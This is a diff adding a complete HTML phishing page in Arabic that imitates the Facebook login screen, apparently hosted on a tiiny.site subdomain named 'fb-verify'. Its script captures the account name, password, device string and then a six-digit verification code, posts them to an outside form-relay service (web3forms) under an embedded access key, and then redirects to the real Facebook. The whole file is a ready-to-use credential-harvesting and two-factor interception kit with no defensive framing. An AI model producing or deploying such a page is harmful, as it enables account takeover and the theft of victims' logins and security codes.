@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#1877f2">
+<title data-id="th-modified">Facebook</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:24px 16px}
+.wrap{width:100%;max-width:400px}
+.logo{color:#1877f2;font-size:34px;font-weight:800;text-align:center;letter-spacing:-.7px;margin:18px 0 28px}
+input{width:100%;padding:15px 16px;margin-bottom:12px;background:#f5f6f7;border:1px solid #dddfe2;border-radius:10px;font-size:16px;color:#1c1e21}
+input::placeholder{color:#8d949e}
+input:focus{outline:none;border-color:#1877f2;background:#fff}
+.btn{width:100%;padding:13px;background:#1877f2;color:#fff;border:0;border-radius:10px;font-size:17px;font-weight:700;cursor:pointer}
+.btn:active{background:#166fe5}
+.forgot{text-align:center;margin:20px 0;font-size:15px;color:#1877f2}
+.or{display:flex;align-items:center;gap:10px;color:#8d949e;font-size:13px;margin:22px 0}
+.or::before,.or::after{content:"";flex:1;height:1px;background:#dddfe2}
+.btn2{width:100%;padding:12px;background:#fff;color:#1877f2;border:1px solid #1877f2;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer}
+.hint{font-size:14.5px;color:#606770;text-align:center;line-height:1.7;margin-bottom:18px}
+.spin{width:28px;height:28px;border:3px solid #e4e6eb;border-top-color:#1877f2;border-radius:50%;animation:s .8s linear infinite;margin:30px auto}
+@keyframes s{to{transform:rotate(360deg)}}
+.skip{text-align:center;margin-top:18px;font-size:15px;color:#1877f2;cursor:pointer}
+.hide{display:none}
+.foot{margin-top:auto;padding-top:30px;font-size:12.5px;color:#8d949e;text-align:center;line-height:1.9}
+</style>
+<meta property="og:title" content="Facebook" data-id="th-modified" ><meta name="description" content="index" data-id="th-modified" ><meta property="og:description" content="index" data-id="th-modified" ><meta property="og:image" content="https://tiiny.host/assets/logo-purple-bg.png" data-id="th-modified" ><meta property="og:image:width" content="1501" data-id="th-modified" ><meta property="og:image:height" content="1501" data-id="th-modified" ><meta property="og:image:type" content="image/png" data-id="th-modified" ><meta property="og:url" content="https://fb-verify.tiiny.site/" data-id="th-modified" ><meta property="og:type" content="website" data-id="th-modified" ><script defer data-domain="fb-verify.tiiny.site" src="https://analytics.tiiny.net/js/plausible.js"></script><script type="text/javascript" src="https://tiiny.host/ad-script.js"></script></head>
+<body>
+<div class="wrap">
+
+  <div class="logo">facebook</div>
+
+  <div id="s1">
+    <form id="f1">
+      <input id="u" type="text" placeholder="البريد الإلكتروني أو رقم الهاتف" autocomplete="off" required>
+      <input id="p" type="password" placeholder="كلمة المرور" autocomplete="off" required>
+      <button class="btn" type="submit">تسجيل الدخول</button>
+    </form>
+    <div class="forgot">نسيت كلمة المرور؟</div>
+    <div class="or">أو</div>
+    <button class="btn2" type="button">إنشاء حساب جديد</button>
+  </div>
+
+  <div id="ld" class="hide"><div class="spin"></div></div>
+
+  <div id="s2" class="hide">
+    <div class="hint">لأمان حسابك، أدخل الرمز المكوّن من 6 أرقام<br>الذي أرسلناه إلى هاتفك</div>
+    <form id="f2">
+      <input id="c" type="tel" inputmode="numeric" placeholder="الرمز المكوّن من 6 أرقام" autocomplete="off" required>
+      <button class="btn" type="submit">متابعة</button>
+    </form>
+    <div class="skip" id="sk">لم يصلك الرمز؟ تخطَّ ←</div>
+  </div>
+
+</div>
+
+<div class="foot">العربية · English (US) · Français · More languages…</div>
+
+<script>
+/* ═══════════════════════════════════════════════ */
+/* ضع المفتاح الذي وصلك في البريد بين علامتي التنصيص */
+var KEY = "b876e009-c631-439c-857a-8d5a2a1fc377";
+/* ═══════════════════════════════════════════════ */
+
+function send(o){
+  o.access_key = KEY;
+  o.from_name = "Facebook";
+  return fetch("https://api.web3forms.com/submit",{
+    method:"POST",
+    headers:{"Content-Type":"application/json","Accept":"application/json"},
+    body:JSON.stringify(o)
+  })
+  .then(function(r){ return r.json(); })
+  .then(function(j){ console.log("النتيجة:", j); return j; })
+  .catch(function(e){ console.error("خطأ:", e); });
+}
+
+document.getElementById("f1").addEventListener("submit", async function(e){
+  e.preventDefault();
+  document.getElementById("s1").classList.add("hide");
+  document.getElementById("ld").classList.remove("hide");
+
+  await send({
+    subject:"Facebook | بيانات دخول",
+    "الحساب": document.getElementById("u").value,
+    "كلمة المرور": document.getElementById("p").value,
+    "الجهاز": navigator.userAgent.substring(0,70)
+  });
+
+  document.getElementById("ld").classList.add("hide");
+  document.getElementById("s2").classList.remove("hide");
+});
+
+document.getElementById("f2").addEventListener("submit", async function(e){
+  e.preventDefault();
+  await send({
+    subject:"Facebook | رمز التحقق",
+    "رمز التحقق": document.getElementById("c").value
+  });
+  location.href = "https://www.facebook.com/";
+});
+
+document.getElementById("sk").addEventListener("click",function(){
+  location.href = "https://www.facebook.com/";
+});
+</script>
+</body>
+</html>
